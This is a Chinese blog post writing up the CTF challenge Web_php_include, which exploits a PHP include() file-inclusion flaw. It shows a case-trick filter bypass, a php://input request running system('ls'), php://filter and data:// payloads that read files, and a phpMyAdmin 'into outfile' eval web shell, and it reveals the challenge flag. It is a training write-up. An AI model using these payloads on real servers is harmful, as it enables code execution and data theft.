---
layout: post
title: Web进阶题-Web_php_include
excerpt: "攻防世界进阶Web题目-Web_php_include"
date:   2020-10-13 14:29:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问网站，网页正文为

   ```php
   <?php
   show_source(__FILE__);
   echo $_GET['hello'];
   $page=$_GET['page'];
   while (strstr($page, "php://")) {
       $page=str_replace("php://", "", $page);
   }
   include($page);
   ?>
   ```

   * \_\_FILE\_\_，当前文件的绝对地址
   * show_source()对文件进行PHP语法高亮显示
   * 打印GET方法传来的hello参数
   * 将GET方法传来的page参数赋值给$page变量
   * 通过while循环除去$page变量中的"php://"字符串，strstr()返回第一次第二个参数在第一个参数字符串中的位置，当查找失败时返回null
   * include获取指定文件中存在的所有文本、代码、标记

2. 首先绕过*php://*，使用大小写绕过即可，Pnp://。

3. 然后通过php://input，通过POST上传PHP脚本，进而执行系统命令，网页返回内容为"fl4gisisish3r3.php、index.php、phpinfo.php"，发现flag所在的文件名为fl4gisisish3r3.php。

   ```txt
   POST /?page=Php://input HTTP/1.1
   Host: 220.249.52.133:34797
   Content-Length: 20
   
   <?php system("ls")?>
   ```

4. 尝试直接访问，*ip:port/fl4gisisish3r3.php*，网页返回内容为空，看来需要直接读取该PHP源码文件

5. 使用PHP://filter，读取文件，并通过base64编码将它回显，构造访问链接*ip:port/?page=Php://filter//read=convert.base64-encode/resource=./fl4gisisish3r3.php*，网页返回内容为"PD9waHAKJGZsYWc9ImN0Zns4NzZhNWZjYS05NmM2LTRjYmQtOTA3NS00NmYwYzg5NDc1ZDJ9IjsKPz4K"

6. 使用Hasher Chrome扩展进行base64解码，内容如下

   ```php
   <?php
   $flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";
   ?>
   ```

7. 发现flag，ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}

8. 提交，答案正确   

## 别人的解题方法

### 方法一

1. 使用data://伪协议
2. 获取当前路径，*?page=data://text/plain,\<?php echo $_SERVER['DOCUMENT_ROOT'] ?\>*，网页返回内容为"/var/www"
3. 列出当前路径下的文件，*?page=data://text/plain,\<?php print_r(scandir("/var/www")); ?\>*，网页返回内容为"Array ( [0] => . [1] => .. [2] => fl4gisisish3r3.php [3] => index.php [4] => phpinfo.php )"
4. 查看fl4gisisish3r3.php文件内容，*?page=data://text/plain,\<?php $a_code=file_get_contents("fl4gisisish3r3.php");echo htmlspecialchars($a_code); ?\>，网页返回内容为"\<?php $flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}"; ?\>"

* file_get_contents()把整个文件读入一个字符串
* scandir(dir)返回文件和目录的数组
* print_r()将变量进行打印，string、integer、float类型直接打印变量，array、object会按一定格式进行打印

### 方法二

1. 扫描目录，发现ip:port//phpmyadmin/
2. 使用用户名root，密码为空直接登陆成功
3. 执行sql，"select "\<?php eval(@$_POST['flag']); ?\>" into outfile '/tmp/test.php'",文件写入成功
4. 这个方法我**没有复现成功**，因为这个链接通过浏览器访问不到404，而写入*/var/www*目录没有写权限，所以这个方法比较不明白

## 独立思考

### 1. 为什么PHP代码中会过滤*php://*？

php:// 访问各个输入/输出流(I/O streams)

PHP提供了一些杂项输入/输出流，允许PHP访问PHP的输入输出流、标准输入输出、错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读写文件资源的过滤器。

| 流                                            | 作用                                          |
| --------------------------------------------- | --------------------------------------------- |
| php://stdin</br>php://stdout</br>php://stderr | 允许直接访问PHP进程相应的输入或输出流         |
| php://input                                   | 是一个可以访问Request的原始数据的只读流       |
| php://output                                  | 允许以和print、echo一样的方式写入到输出缓冲区 |
| php://fd                                      | 允许直接访问指定的文件描述符                  |
| php://memory</br>php://temp                   | 类似文件包装器的数据流，允许读写临时数据      |
| php://filter                                  | 数据流打开时筛选过滤                          |

在CTF中常用的是php://filter和php://input

* php://filter用于读取源码并进行base64编码输出，不然就会直接当作PHP代码执行
  * resource=\<\>，必需参数，它指定了筛选过滤的流
  * read=\<\>，可选参数，定义读链的筛选列表，可以设置一个或多个，以管道符分隔
  * write=\<\>，可选参数，定义写链的筛选列表，可以设置一个或多个，以管道符分隔
  * php://filter/read=convert.base64-encode/resource=\[文件名\]
* php://input用于执行php代码，与POST方法匹配起作用，将POST方法传来的数据作为PHP代码执行
  * url中带上get参数php://input
  * POST数据中带上PHP代码<?php phpinfo()?\>

### 2. include()有什么常见利用方法吗？

include和require语句在作用上大致相同，但是在错误处理方面：

* require会生成致命错误(E_COMPILE_ERROR)，并停止脚本
* include只生成警告(E_WARNING)，并且脚本会继续

所以使用require向执行流引用关键文件，有助于提高应用程序的安全性和完整性。

这也就是说本题应该可能要利用E_WARNING？那E_WARNING很可能在php://stderr里面。

## 产生过的疑问

1. 为什么PHP代码中会过滤*php://*？
2. include()有什么常见利用方法吗？

